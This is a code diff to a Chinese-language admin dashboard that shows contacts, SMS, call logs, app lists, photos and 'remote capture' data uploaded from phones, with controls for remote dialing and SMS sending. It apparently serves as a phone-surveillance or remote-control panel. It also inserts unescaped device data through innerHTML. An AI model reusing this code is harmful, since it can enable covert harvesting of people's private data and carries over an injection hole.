@@ -45,7 +45,7 @@
             <colgroup>
               <col class="col-device-user">
               <col class="col-device-network">
-              <col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit">
+              <col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit"><col class="col-audit">
               <col class="col-dial">
               <col class="col-sms">
               <col class="col-custom">
@@ -60,6 +60,7 @@
                 <th id="colSms">短信总数</th>
                 <th id="colCallRecords">通话记录总数</th>
                 <th id="colAppList">APP列表总数</th>
+                <th id="colCaptures">远程采集</th>
                 <th id="colDial">拨号设置</th>
                 <th id="colSmsSend">发送短信到</th>
                 <th id="colCustom">自定义</th>
@@ -67,7 +68,7 @@
               </tr>
             </thead>
             <tbody id="deviceTableBody">
-              <tr><td colspan="11" class="loading-cell" id="deviceTableLoading"></td></tr>
+              <tr><td colspan="12" class="loading-cell" id="deviceTableLoading"></td></tr>
             </tbody>
           </table>
         </div>
@@ -131,6 +132,7 @@
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('smsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitSms') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="sms">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="sms">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="sms">' + i18n.t('export') + '</button></div></td>' +
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('callRecordsLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitCalls') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="calllog">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="calllog">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="calllog">' + i18n.t('export') + '</button></div></td>' +
           '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('appListLabel') + '</span>:<span class="audit-count"><span data-masked="**" data-full="—">**</span> <span>' + i18n.t('unitApps') + '</span></span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="applist">' + i18n.t('view') + '</button><button type="button" class="btn btn-sm btn-audit-copy" data-page="applist">' + i18n.t('copy') + '</button><button type="button" class="btn btn-sm btn-audit-export" data-page="applist">' + i18n.t('export') + '</button></div></td>' +
+          '<td class="audit-cell"><div class="audit-label-count"><span class="audit-label">' + i18n.t('capturesLabel') + '</span></div><div class="audit-actions"><button type="button" class="btn btn-sm btn-audit-view" data-page="captures">' + i18n.t('view') + '</button></div></td>' +
           '<td class="control-cell control-cell-vertical" headers="colDial"><div class="control-col-dial"><div class="control-row"><input type="text" class="dial-number-input" placeholder="' + (i18n.t('dialNumber') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-dial-cmd">' + i18n.t('dialButton') + '</button></div><div class="control-row"><button type="button" class="btn btn-sm">' + i18n.t('hangUpButton') + '</button></div></div></td>' +
           '<td class="control-cell control-cell-vertical" headers="colSmsSend"><div class="control-col-sms"><div class="control-row"><input type="text" class="sms-number-input" placeholder="' + (i18n.t('smsNumber') || '') + '"></div><div class="control-row"><input type="text" class="sms-body-input" placeholder="' + (i18n.t('smsContent') || '') + '"></div><div class="control-row"><button type="button" class="btn btn-sm btn-sms-cmd">' + i18n.t('sendButton') + '</button></div></div></td>' +
           '<td class="control-cell" headers="colCustom"><div class="control-col-custom custom-func-block"><button type="button" class="btn btn-sm">' + i18n.t('func1') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func2') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func3') + '</button><button type="button" class="btn btn-sm">' + i18n.t('func4') + '</button></div></td>' +
@@ -141,7 +143,7 @@
         var tbody = document.getElementById('deviceTableBody');
         if (!tbody) return;
         if (!items || items.length === 0) {
-          tbody.innerHTML = '<tr><td colspan="11" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>';
+          tbody.innerHTML = '<tr><td colspan="12" class="loading-cell">' + i18n.t('noDevices') + '</td></tr>';
           return;
         }
         tbody.innerHTML = items.map(buildDeviceRow).join('');
@@ -189,6 +191,8 @@
       document.getElementById('colSms').textContent = i18n.t('smsTotal');
       document.getElementById('colCallRecords').textContent = i18n.t('callRecordsTotal');
       document.getElementById('colAppList').textContent = i18n.t('appListTotal');
+      var colCapturesEl = document.getElementById('colCaptures');
+      if (colCapturesEl) colCapturesEl.textContent = i18n.t('capturesLabel') || '远程采集';
       document.getElementById('auditQueryLabel').textContent = i18n.t('auditQueryLabel');
       document.getElementById('auditQueryInput').placeholder = i18n.t('queryPlaceholder');
       document.getElementById('auditQueryBtn').textContent = i18n.t('queryButton');
@@ -306,21 +310,24 @@
         URL.revokeObjectURL(url);
       }
       var placeholders = ['https://picsum.photos/200/200?random=1','https://picsum.photos/200/200?random=2','https://picsum.photos/200/200?random=3','https://picsum.photos/200/200?random=4','https://picsum.photos/200/200?random=5'];
-      var pageToApiType = { contacts: 'contacts', sms: 'sms', calllog: 'call_log', applist: 'app_list', gallery: 'gallery' };
+      var pageToApiType = { contacts: 'contacts', sms: 'sms', calllog: 'call_log', applist: 'app_list', gallery: 'gallery', captures: 'captures' };
       function renderMockAudit(page, deviceId, bodyEl) {
         var data = MOCK_AUDIT[deviceId] || MOCK_AUDIT.dev_a1b2c3;
         if (page === 'contacts') {
           bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>姓名</th><th>号码</th><th>上报时间</th></tr></thead><tbody>' + data.contacts.map(function(r){ return '<tr><td>'+r.name+'</td><td>'+r.phone+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
         } else if (page === 'sms') {
-          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>内容</th><th>上报时间</th></tr></thead><tbody>' + data.sms.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.body+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
+          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>内容</th><th>收发时间</th></tr></thead><tbody>' + data.sms.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.body+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
         } else if (page === 'calllog') {
-          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>时长</th><th>上报时间</th></tr></thead><tbody>' + data.calllog.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.duration+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
+          bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>类型</th><th>号码</th><th>时长</th><th>拨出/接听时间</th></tr></thead><tbody>' + data.calllog.map(function(r){ return '<tr><td>'+r.type+'</td><td>'+r.number+'</td><td>'+r.duration+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
         } else if (page === 'applist') {
           bodyEl.innerHTML = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>应用名</th><th>包名</th><th>上报时间</th></tr></thead><tbody>' + data.applist.map(function(r){ return '<tr><td>'+r.name+'</td><td>'+r.pkg+'</td><td>'+r.time+'</td></tr>'; }).join('') + '</tbody></table></div>';
         } else if (page === 'gallery') {
           bodyEl.innerHTML = '<div class="gallery-grid">' + (data.gallery || []).map(function(src, i){ return '<img src="'+src+'" alt="相册'+(i+1)+'" onerror="this.src=\''+ (placeholders[i]||placeholders[0]) +'\'" />'; }).join('') + '</div>';
+        } else if (page === 'captures') {
+          bodyEl.innerHTML = '<p>' + (i18n.t('noCaptures') || '暂无采集数据') + '</p>';
         } else { bodyEl.innerHTML = '<p>暂无数据</p>'; }
       }
+      /** 渲染审计记录列表（含「下载」按钮）；用于远程采集等无法直接展示内容时 */
       function renderApiItems(page, items, bodyEl) {
         if (!items || items.length === 0) { bodyEl.innerHTML = '<p>暂无数据</p>'; return; }
         if (page === 'gallery' && items[0].url != null) {
@@ -347,27 +354,129 @@
           };
         });
       }
+      var AUDIT_PAGE_SIZE = 20;
+      function formatTimestamp(ms) {
+        if (ms == null) return '—';
+        var n = typeof ms === 'number' ? ms : parseInt(ms, 10);
+        if (isNaN(n)) return String(ms);
+        var d = new Date(n < 1e12 ? n * 1000 : n);
+        if (isNaN(d.getTime())) return String(ms);
+        var pad = function (x) { return (x < 10 ? '0' : '') + x; };
+        return d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate()) + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes());
+      }
+      function smsTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '收'; case 2: return '发'; case 3: return '草稿'; default: return String(t); } }
+      function callTypeText(t) { var n = t != null ? parseInt(t, 10) : NaN; if (isNaN(n)) return t != null ? String(t) : '—'; switch (n) { case 1: return '接听'; case 2: return '拨出'; case 3: return '未接'; default: return String(t); } }
+      /** 渲染解密后的审计内容（含分页）；bodyEl._auditItems / _auditPage / _auditPageType 用于分页 */
+      function renderAuditContent(page, payload, bodyEl) {
+        var items = (payload && payload.items) ? payload.items : [];
+        if (items.length === 0) { bodyEl.innerHTML = '<p>暂无内容</p>'; return; }
+        bodyEl._auditItems = items;
+        bodyEl._auditPage = 1;
+        bodyEl._auditPageType = page;
+        renderAuditContentPage(bodyEl);
+      }
+      function renderAuditContentPage(bodyEl) {
+        var items = bodyEl._auditItems || [];
+        var page = Math.max(1, bodyEl._auditPage || 1);
+        var pageType = bodyEl._auditPageType || '';
+        var totalPages = Math.max(1, Math.ceil(items.length / AUDIT_PAGE_SIZE));
+        if (page > totalPages) page = totalPages;
+        bodyEl._auditPage = page;
+        var start = (page - 1) * AUDIT_PAGE_SIZE;
+        var end = Math.min(start + AUDIT_PAGE_SIZE, items.length);
+        var pageItems = items.slice(start, end);
+        var html = '';
+        if (pageType === 'contacts') {
+          var rows = pageItems.map(function(r) {
+            var name = (r.display_name != null ? r.display_name : ((r.given_name || '') + ' ' + (r.family_name || '')).trim()) || '—';
+            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + name + '</td></tr>';
+          });
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>姓名</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+        } else if (pageType === 'gallery') {
+          var rows = pageItems.map(function(r) {
+            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + (r.date_added != null ? r.date_added : '') + '</td><td>' + (r.size != null ? r.size : (r.kind || '')) + '</td><td>' + (r.mime_type || r.kind || '') + '</td></tr>';
+          });
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>日期/时间戳</th><th>大小/类型</th><th>MIME/类型</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+        } else if (pageType === 'sms') {
+          var rows = pageItems.map(function(r) {
+            var timeStr = formatTimestamp(r.date);
+            var typeStr = smsTypeText(r.type);
+            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + typeStr + '</td><td>' + (r.address || '') + '</td><td>' + timeStr + '</td><td>' + (r.body_length != null ? r.body_length + ' 字符' : '') + '</td></tr>';
+          });
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>类型</th><th>地址</th><th>收发时间</th><th>内容长度</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+        } else if (pageType === 'calllog') {
+          var rows = pageItems.map(function(r) {
+            var timeStr = formatTimestamp(r.date);
+            var typeStr = callTypeText(r.type);
+            return '<tr><td>' + (r.id != null ? r.id : '') + '</td><td>' + typeStr + '</td><td>' + (r.number || '') + '</td><td>' + timeStr + '</td><td>' + (r.duration != null ? r.duration + ' 秒' : '') + '</td></tr>';
+          });
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>ID</th><th>类型</th><th>号码</th><th>拨出/接听时间</th><th>时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+        } else if (pageType === 'applist') {
+          var rows = pageItems.map(function(r) { return '<tr><td>' + (r.package || '') + '</td><td>' + (r.version_name || '') + '</td><td>' + (r.long_version_code != null ? r.long_version_code : '') + '</td></tr>'; });
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>包名</th><th>版本名</th><th>版本号</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+        } else if (pageType === 'usage') {
+          var rows = pageItems.map(function(r) { var ms = r.total_time_ms != null ? r.total_time_ms : 0; var sec = Math.floor(ms / 1000); return '<tr><td>' + (r.package || '') + '</td><td>' + sec + ' 秒</td></tr>'; });
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead><tr><th>包名</th><th>前台时长</th></tr></thead><tbody>' + rows.join('') + '</tbody></table></div>';
+        } else {
+          var keys = Object.keys(pageItems[0] || {});
+          var thead = '<tr>' + keys.map(function(k){ return '<th>' + k + '</th>'; }).join('') + '</tr>';
+          var tbody = pageItems.map(function(row){ return '<tr>' + keys.map(function(k){ return '<td>' + (row[k] != null ? row[k] : '') + '</td>'; }).join('') + '</tr>'; }).join('');
+          html = '<div class="table-wrap"><table class="audit-modal-table"><thead>'+thead+'</thead><tbody>'+tbody+'</tbody></table></div>';
+        }
+        var hint = '<p class="audit-content-hint">以下为最新一次上报内容，共 ' + items.length + ' 条</p>';
+        var pagination = '';
+        if (totalPages > 1) {
+          pagination = '<div class="audit-pagination"><button type="button" class="btn btn-sm audit-prev">上一页</button><span class="audit-page-info">第 ' + page + ' / ' + totalPages + ' 页</span><button type="button" class="btn btn-sm audit-next">下一页</button></div>';
+        }
+        bodyEl.innerHTML = hint + html + pagination;
+        if (totalPages > 1) {
+          bodyEl.querySelector('.audit-prev').onclick = function() { bodyEl._auditPage = Math.max(1, (bodyEl._auditPage || 1) - 1); renderAuditContentPage(bodyEl); };
+          bodyEl.querySelector('.audit-next').onclick = function() { bodyEl._auditPage = Math.min(totalPages, (bodyEl._auditPage || 1) + 1); renderAuditContentPage(bodyEl); };
+        }
+      }
       function openAuditModal(page, deviceId){
         var overlay = document.getElementById('auditModalOverlay');
         var titleEl = document.getElementById('auditModalTitle');
         var bodyEl = document.getElementById('auditModalBody');
-        var titles = { contacts: '通讯录', gallery: '相册', sms: '短信', calllog: '通话记录', applist: '已安装APP' };
-        titleEl.textContent = (titles[page] || page) + ' - ' + deviceId;
+        var titles = { contacts: '通讯录', gallery: '相册', sms: '短信', calllog: '通话记录', applist: '已安装APP', captures: (i18n && i18n.t('capturesLabel')) ? i18n.t('capturesLabel') : '远程采集' };
+        if (page === 'usage') titles.usage = '应用使用时长';
+        titleEl.textContent = (titles[page] || page) + ' - ' + (deviceId ? deviceId.slice(0, 12) + '…' : '');
         var apiType = pageToApiType[page];
         if (apiType && adminApi && adminApi.getAdminToken() && adminApi.getAudit) {
+          bodyEl.innerHTML = '<p class="loading-hint">加载中…</p>';
+          overlay.style.display = 'flex';
           adminApi.getAudit(deviceId, apiType).then(function(data) {
-            if (data.items && data.items.length > 0) {
-              renderApiItems(page, data.items, bodyEl);
-            } else {
-              renderMockAudit(page, deviceId, bodyEl);
+            if (!data.items || data.items.length === 0) {
+              bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditData') || '暂无上报数据，请确保设备已授权并完成采集上报。') + '</p>';
+              return;
             }
-            overlay.style.display = 'flex';
+            if (page === 'captures') {
+              renderApiItems(page, data.items, bodyEl);
+              return;
+            }
+            var latestId = data.items[0].id;
+            if (!adminApi.getAuditBlobJson) { renderApiItems(page, data.items, bodyEl); return; }
+            adminApi.getAuditBlobJson(latestId).then(function(payload) {
+              renderAuditContent(page, payload, bodyEl);
+              var wrap = bodyEl.querySelector('.audit-content-hint');
+              if (wrap) {
+                var btn = document.createElement('button');
+                btn.type = 'button';
+                btn.className = 'btn btn-sm';
+                btn.textContent = i18n.t('download') || '下载';
+                btn.onclick = function() { adminApi.downloadAuditBlob(latestId, 'audit_' + latestId + '_' + apiType + '.json'); };
+                wrap.appendChild(document.createTextNode(' '));
+                wrap.appendChild(btn);
+              }
+            }).catch(function() {
+              bodyEl.innerHTML = '<p>获取内容失败，仅显示上报记录。</p>';
+              renderApiItems(page, data.items, bodyEl);
+            });
           }).catch(function() {
-            renderMockAudit(page, deviceId, bodyEl);
-            overlay.style.display = 'flex';
+            bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditDataOrFailed') || '暂无上报数据或加载失败，请确认设备已上报。') + '</p>';
           });
         } else {
-          renderMockAudit(page, deviceId, bodyEl);
+          bodyEl.innerHTML = '<p class="audit-empty-hint">' + (i18n.t('noAuditData') || '暂无上报数据，请确保设备已授权并完成采集上报。') + '</p>';
           overlay.style.display = 'flex';
         }
       }
